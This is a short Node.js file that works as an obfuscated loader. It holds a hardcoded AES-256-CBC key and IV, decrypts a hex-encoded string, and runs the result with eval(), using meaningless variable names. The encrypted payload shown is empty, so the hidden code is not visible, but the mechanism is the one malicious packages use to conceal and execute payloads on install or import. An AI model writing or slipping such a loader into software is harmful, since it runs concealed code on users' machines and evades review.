const ito = require('crypto');
const itinho = Buffer.from('8ed7d20ded56c9228610cdf3a2479628d981886094856c36acd1275849748142', 'hex');
const octua = Buffer.from('64ec5308228f91287753fe0fb144742f', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
